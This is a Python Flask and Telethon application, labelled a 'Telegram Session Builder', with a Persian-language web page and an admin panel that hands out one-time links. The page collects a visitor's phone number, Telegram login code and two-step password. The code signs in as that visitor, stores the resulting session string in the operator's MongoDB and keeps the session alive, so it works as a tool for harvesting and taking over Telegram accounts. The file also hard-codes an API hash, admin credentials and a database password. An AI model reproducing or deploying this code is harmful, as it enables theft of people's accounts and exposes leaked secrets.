# ================================================================
# Telegram Session Builder – Full Stable Version
# Admin Panel + MongoDB + One-Time Links + Keep Alive
# By: Tiam
# ================================================================

import os, asyncio, threading, secrets, time
from flask import Flask, request, jsonify, render_template_string, redirect
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from pymongo import MongoClient
from datetime import datetime

# ===================== CONFIG ===================================

self_config = {
    "api_id": 24645053,
    "api_hash": "88c0167b74a24fac0a85c26c1f6d1991",
    "admin_username": "tiam.",
    "admin_password": "tiam_khorshid",
    "save_path": "sessions"  # مسیر ذخیره session ها
}

os.makedirs(self_config["save_path"], exist_ok=True)

# ===================== MongoDB ==================================

mongo_uri = (
    "mongodb://strawhatmusicdb_db_user:db_strawhatmusic@"
    "ac-hw2zgfj-shard-00-00.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-01.morh5s8.mongodb.net:27017,"
    "ac-hw2zgfj-shard-00-02.morh5s8.mongodb.net:27017/"
    "?replicaSet=atlas-7m1dmi-shard-0&ssl=true&authSource=admin"
)

mongo = MongoClient(mongo_uri)
db = mongo["telegram_sessions"]
sessions_col = db["sessions"]
links_col = db["links"]

# ===================== Flask ====================================

app = Flask(__name__, static_folder="static")

# ===================== Async Loop ================================

class LoopThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.loop = asyncio.new_event_loop()

    def run(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

loop_thread = LoopThread()
loop_thread.start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop_thread.loop).result()

# ===================== HTML =====================================

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>ساخت سشن تلگرام</title>
<style>
body{background:url('/static/images/astronomy-1867616_1280.jpg') no-repeat center fixed;background-size:cover;font-family:tahoma;color:white}
.box{width:360px;margin:120px auto;padding:25px;background:rgba(0,0,0,.65);border-radius:16px;text-align:center}
input,button{width:95%;padding:12px;margin-top:10px;border-radius:10px;border:none;font-size:16px}
button{background:#5865f2;color:white;cursor:pointer}
</style>
</head>
<body>
<div class="box">
<h3>ساخت سشن تلگرام</h3>
<p>شماره خود را با فرمت وارد کنید مثال: <b>+98939xxxxxxx<b> <p>
<div id="s1">
<input id="phone" placeholder="شماره تلفن">
<button onclick="sendPhone()">ارسال کد</button>
</div>

<div id="s2" style="display:none">
<input id="code" placeholder="کد تلگرام">
<button onclick="sendCode()">تأیید</button>
</div>

<div id="s3" style="display:none">
<input id="password" type="password" placeholder="رمز دو مرحله‌ای">
<button onclick="sendPassword()">تأیید</button>
</div>

<div id="done" style="display:none">
<h3>✅ سشن ساخته شد</h3>
</div>
</div>

<script>
let phone="";

function sendPhone(){
 phone = document.getElementById("phone").value;
 fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
 .then(r=>r.json()).then(d=>{
   alert(d.message);
   if(d.status=="ok"){s1.style.display="none";s2.style.display="block";}
 });
}

function sendCode(){
 fetch("/send_code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,code:code.value})})
 .then(r=>r.json()).then(d=>{
   if(d.status=="2fa"){s2.style.display="none";s3.style.display="block";}
   if(d.status=="ok"){finish();}
 });
}

function sendPassword(){
 fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:password.value})})
 .then(r=>r.json()).then(d=>{if(d.status=="ok"){finish();}});
}

function finish(){
 s1.style.display=s2.style.display=s3.style.display="none";
 done.style.display="block";
}

setInterval(()=>fetch("/ping"),240000);
</script>
</body>
</html>
"""

# ===================== Utils ====================================

def gen_token():
    return secrets.token_urlsafe(8)

def consume_link(token):
    link = links_col.find_one({"token": token})
    if not link:
        return False
    if link["used"] + 1 >= link["max"]:
        links_col.delete_one({"token": token})
    else:
        links_col.update_one({"token": token}, {"$inc": {"used": 1}})
    return True

# ===================== Routes ===================================

@app.route("/")
def home():
    t = request.args.get("key")
    if not t or not consume_link(t):
        return "❌ لینک نامعتبر یا منقضی شده"
    return render_template_string(HTML_PAGE)

@app.route("/ping")
def ping():
    return "OK"

# ===================== Admin Panel ===============================

@app.route("/admin", methods=["GET","POST"])
def admin():
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401, {"WWW-Authenticate": "Basic realm='Admin'"})

    if request.method == "POST":
        links_col.insert_one({
            "token": gen_token(),
            "max": int(request.form["max"]),
            "used": 0,
            "created": datetime.utcnow()
        })
        return redirect("/admin")

    rows=""
    for l in links_col.find():
        rows+=f"""
        <tr>
        <td>?key={l['token']}</td>
        <td>{l['used']} / {l['max']}</td>
        <td>
        <button onclick="navigator.clipboard.writeText('?key={l['token']}')">کپی لینک</button>
        <a href="/admin/delete/{l['token']}">❌ حذف</a>
        </td>
        </tr>
        """

    return f"""
    <html><body style="background:#111;color:white;font-family:tahoma">
    <h2>پنل ادمین</h2>
    <form method="post">
    <input name="max" type="number" placeholder="تعداد استفاده" required>
    <button>ساخت لینک</button>
    </form>
    <table border=1 cellpadding=10>{rows}</table>
    </body></html>
    """

@app.route("/admin/delete/<token>")
def delete(token):
    auth = request.authorization
    if not auth or auth.username != self_config["admin_username"] or auth.password != self_config["admin_password"]:
        return ("Unauthorized", 401)
    links_col.delete_one({"token": token})
    return redirect("/admin")

# ===================== Telethon ================================

clients = {}

async def create_client(phone):
    session_path = os.path.join(self_config["save_path"], f"{phone}.session")
    client = TelegramClient(
        session_path,
        self_config["api_id"],
        self_config["api_hash"],
        device_model="⦁ 𝑺𝒆𝒍𝒇 𝑵𝒊𝒙",
        system_version="13",
        app_version="10.5.0",
        lang_code="fa",
        system_lang_code="fa"
    )
    await client.connect()
    return client

@app.route("/send_phone", methods=["POST"])
def send_phone():
    phone = request.json["phone"]
    async def job():
        c = await create_client(phone)
        clients[phone] = c
        await c.send_code_request(phone)
    run_async(job())
    return jsonify(status="ok", message="کد ارسال شد")

@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json["phone"]
    code = request.json["code"]
    c = clients.get(phone)
    try:
        async def job():
            await c.sign_in(phone, code)
            sessions_col.insert_one({"phone": phone, "session": c.session.save()})
        run_async(job())
        return jsonify(status="ok")
    except SessionPasswordNeededError:
        return jsonify(status="2fa")
    except PhoneCodeInvalidError:
        return jsonify(status="error")

@app.route("/send_password", methods=["POST"])
def send_password():
    phone = request.json["phone"]
    pwd = request.json["password"]
    c = clients.get(phone)
    async def job():
        await c.sign_in(password=pwd)
        sessions_col.insert_one({"phone": phone, "session": c.session.save()})
    run_async(job())
    return jsonify(status="ok")

# ===================== Keep Alive ===============================

def keep_alive():
    while True:
        for phone, client in clients.items():
            try:
                run_async(client.get_me())
            except:
                pass
        time.sleep(120)

threading.Thread(target=keep_alive, daemon=True).start()

# ===================== Run ======================================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
